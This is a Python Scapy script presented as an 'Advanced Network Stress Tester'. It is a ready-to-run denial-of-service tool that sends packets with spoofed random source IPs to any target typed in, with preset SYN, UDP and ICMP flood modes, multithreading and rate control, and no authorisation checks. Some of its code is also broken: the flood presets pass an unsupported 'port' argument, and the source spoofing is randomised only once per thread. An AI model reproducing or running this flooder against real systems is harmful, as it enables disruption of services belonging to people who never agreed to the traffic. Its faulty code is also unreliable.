#!/usr/bin/env python3
import sys
import random
import time
import argparse
from threading import Thread, Lock
from scapy.all import *
import signal

class AdvancedNetworkTester:
    def __init__(self):
        self.running = False
        self.threads = []
        self.lock = Lock()
        self.sent_packets = 0
        self.test_start_time = 0
        self.current_test = None
        self.verbose = False
        self.packet_interval = 0.001  # Default 1ms between packets
        self.timeout = 10  # Default test duration in seconds
        
        # Pre-define common ports for protocol detection
        self.common_ports = {
            'http': 80,
            'https': 443,
            'dns': 53,
            'ftp': 21,
            'ssh': 22,
            'smtp': 25
        }

    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.stop_test()
        print("\nTest stopped by user")
        sys.exit(0)

    def clear_screen(self):
        """Cross-platform screen clearing"""
        print("\033[H\033[J", end="")

    def show_banner(self):
        """Display program banner"""
        self.clear_screen()
        print("""
 ▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ 
▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒
░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ 
░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░
 ░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░
   ░       ░  ░     ░  ░   ░               ░  ░  ░
 ░ 
     Advanced Network Stress Tester (Scapy)
""")

    def generate_random_ip(self):
        """Efficient random IP generation"""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def create_packet(self, target_ip, target_port, protocol="tcp", payload_size=64):
        """Create optimized network packets with various options"""
        src_ip = self.generate_random_ip()
        src_port = random.randint(1024, 65535)
        
        # Base IP layer
        ip_layer = IP(src=src_ip, dst=target_ip, id=random.randint(1, 65535))
        
        # Protocol-specific layers
        if protocol.lower() == "tcp":
            transport = TCP(sport=src_port, dport=target_port, 
                          seq=random.randint(0, 4294967295),
                          flags="S",  # SYN flag for connection simulation
                          window=random.randint(1024, 65535))
        elif protocol.lower() == "udp":
            transport = UDP(sport=src_port, dport=target_port)
        elif protocol.lower() == "icmp":
            transport = ICMP(type=8, code=0)  # Echo request
        else:
            transport = IP()/Raw(load="X"*payload_size)
        
        # Add payload if specified
        if payload_size > 0:
            payload = Raw(load=bytes(random.getrandbits(8) for _ in range(payload_size)))
            return ip_layer/transport/payload
        return ip_layer/transport

    def send_traffic(self, target_ip, target_port, protocol, duration, rate, payload_size):
        """Efficient traffic generation with rate control"""
        packet = self.create_packet(target_ip, target_port, protocol, payload_size)
        delay = 1.0 / rate if rate > 0 else 0
        start_time = time.time()
        
        while self.running and (time.time() - start_time < duration):
            send(packet, verbose=False)
            with self.lock:
                self.sent_packets += 1
            
            if delay > 0:
                time.sleep(delay)
            
            # Dynamic rate adjustment for smoother performance
            if self.sent_packets % 100 == 0:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    current_rate = self.sent_packets / elapsed
                    if current_rate > rate * 1.1:  # If exceeding target rate
                        delay *= 1.05
                    elif current_rate < rate * 0.9:  # If below target rate
                        delay *= 0.95

    def start_test(self, target_ip, target_port=None, protocol="tcp", 
                  duration=10, rate=100, threads=3, payload_size=64):
        """Start a controlled stress test"""
        if not target_port:
            target_port = self.common_ports.get(protocol, 80)
            
        self.running = True
        self.sent_packets = 0
        self.test_start_time = time.time()
        self.current_test = {
            'target': target_ip,
            'port': target_port,
            'protocol': protocol,
            'start_time': self.test_start_time
        }
        
        print(f"\nStarting {protocol.upper()} test to {target_ip}:{target_port}")
        print(f"Duration: {duration}s | Rate: {rate} pps | Threads: {threads}")
        print(f"Payload size: {payload_size} bytes\n")
        
        # Start monitoring thread
        monitor_thread = Thread(target=self.monitor_test)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start worker threads
        for _ in range(threads):
            thread = Thread(
                target=self.send_traffic,
                args=(target_ip, target_port, protocol, duration, rate/threads, payload_size)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Wait for test duration or manual stop
        time.sleep(duration)
        self.stop_test()
        
        # Calculate final statistics
        test_duration = time.time() - self.test_start_time
        if test_duration > 0:
            avg_rate = self.sent_packets / test_duration
            print(f"\nTest completed. Sent {self.sent_packets} packets")
            print(f"Average rate: {avg_rate:.1f} packets/second")
            print(f"Total duration: {test_duration:.2f} seconds")

    def monitor_test(self):
        """Monitor test progress with minimal overhead"""
        while self.running:
            elapsed = time.time() - self.test_start_time
            if elapsed > 0:
                with self.lock:
                    current_count = self.sent_packets
                rate = current_count / elapsed
                print(f"\rPackets: {current_count} | Rate: {rate:.1f} pps | Elapsed: {elapsed:.1f}s", end="")
            time.sleep(0.5)

    def stop_test(self):
        """Stop all test activities"""
        if self.running:
            self.running = False
            for thread in self.threads:
                thread.join()
            self.threads.clear()

    def run_advanced_test(self, test_type, target):
        """Predefined test scenarios"""
        tests = {
            'syn-flood': {'protocol': 'tcp', 'rate': 1000, 'duration': 30},
            'udp-flood': {'protocol': 'udp', 'rate': 500, 'duration': 30, 'payload_size': 512},
            'icmp-flood': {'protocol': 'icmp', 'rate': 200, 'duration': 30},
            'http-load': {'protocol': 'tcp', 'port': 80, 'rate': 200, 'duration': 60},
            'dns-test': {'protocol': 'udp', 'port': 53, 'rate': 100, 'duration': 30}
        }
        
        if test_type not in tests:
            print(f"Unknown test type: {test_type}")
            return
            
        params = tests[test_type]
        print(f"\nRunning {test_type} test against {target}")
        self.start_test(target, **params)

    def interactive_menu(self):
        """User-friendly interactive interface"""
        signal.signal(signal.SIGINT, self.signal_handler)
        
        while True:
            self.show_banner()
            print("\nMain Menu:")
            print("1. Quick Test (Basic Parameters)")
            print("2. Advanced Test (Predefined Scenarios)")
            print("3. Custom Test (Full Control)")
            print("4. Stop Current Test")
            print("5. Exit")
            
            try:
                choice = input("\nSelect option: ").strip()
                
                if choice == "1":
                    self.run_quick_test()
                elif choice == "2":
                    self.run_advanced_menu()
                elif choice == "3":
                    self.run_custom_test()
                elif choice == "4":
                    self.stop_test()
                    print("Test stopped")
                    time.sleep(1)
                elif choice == "5":
                    self.stop_test()
                    print("Exiting...")
                    break
                else:
                    print("Invalid choice")
                    time.sleep(1)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(2)

    def run_quick_test(self):
        """Simplified test configuration"""
        self.show_banner()
        print("\nQuick Test Configuration:")
        
        target = input("Target IP/hostname: ").strip()
        protocol = input("Protocol (tcp/udp/icmp) [tcp]: ").strip().lower() or "tcp"
        duration = int(input("Duration (seconds) [10]: ").strip() or "10")
        
        self.start_test(target, protocol=protocol, duration=duration)
        input("\nPress Enter to continue...")

    def run_advanced_menu(self):
        """Menu for predefined test scenarios"""
        self.show_banner()
        print("\nAdvanced Test Scenarios:")
        print("1. SYN Flood (TCP)")
        print("2. UDP Flood")
        print("3. ICMP Flood (Ping)")
        print("4. HTTP Load Test")
        print("5. DNS Stress Test")
        print("6. Back to Main Menu")
        
        choice = input("\nSelect test type: ").strip()
        if choice == "6":
            return
            
        test_types = ['syn-flood', 'udp-flood', 'icmp-flood', 'http-load', 'dns-test']
        try:
            test_idx = int(choice) - 1
            if 0 <= test_idx < len(test_types):
                target = input("Target IP/hostname: ").strip()
                self.run_advanced_test(test_types[test_idx], target)
                input("\nPress Enter to continue...")
        except ValueError:
            print("Invalid choice")
            time.sleep(1)

    def run_custom_test(self):
        """Full custom test configuration"""
        self.show_banner()
        print("\nCustom Test Configuration:")
        
        target = input("Target IP/hostname: ").strip()
        protocol = input("Protocol (tcp/udp/icmp/raw) [tcp]: ").strip().lower() or "tcp"
        port = input(f"Target port [{'auto' if protocol != 'raw' else 'N/A'}]:").strip()
        port = int(port) if port.isdigit() else None
        
        duration = int(input("Duration (seconds) [30]: ").strip() or "30")
        rate = int(input("Packets per second [100]: ").strip() or "100")
        threads = int(input("Threads [3]: ").strip() or "3")
        payload_size = int(input("Payload size (bytes) [64]: ").strip() or "64")
        
        self.start_test(
            target,
            target_port=port,
            protocol=protocol,
            duration=duration,
            rate=rate,
            threads=threads,
            payload_size=payload_size
        )
        input("\nPress Enter to continue...")

def main():
    if os.geteuid() != 0:
        print("This tool requires root privileges. Please run with sudo.")
        sys.exit(1)
        
    tester = AdvancedNetworkTester()
    
    # Command-line mode if arguments provided
    parser = argparse.ArgumentParser(description="Advanced Network Stress Tester")
    parser.add_argument("target", nargs="?", help="Target IP/hostname")
    parser.add_argument("-p", "--port", type=int, help="Target port")
    parser.add_argument("-t", "--protocol", choices=["tcp", "udp", "icmp", "raw"], 
                      default="tcp", help="Protocol to use")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Test duration in seconds")
    parser.add_argument("-r", "--rate", type=int, default=100, help="Packets per second")
    parser.add_argument("-n", "--threads", type=int, default=3, help="Number of threads")
    parser.add_argument("-s", "--size", type=int, default=64, help="Payload size in bytes")
    parser.add_argument("-a", "--advanced", choices=["syn-flood", "udp-flood", "icmp-flood", 
                      "http-load", "dns-test"], help="Run predefined test scenario")
    
    args = parser.parse_args()
    
    if args.advanced and args.target:
        tester.run_advanced_test(args.advanced, args.target)
    elif args.target:
        tester.start_test(
            args.target,
            target_port=args.port,
            protocol=args.protocol,
            duration=args.duration,
            rate=args.rate,
            threads=args.threads,
            payload_size=args.size
        )
    else:
        tester.interactive_menu()

if __name__ == "__main__":
    main()
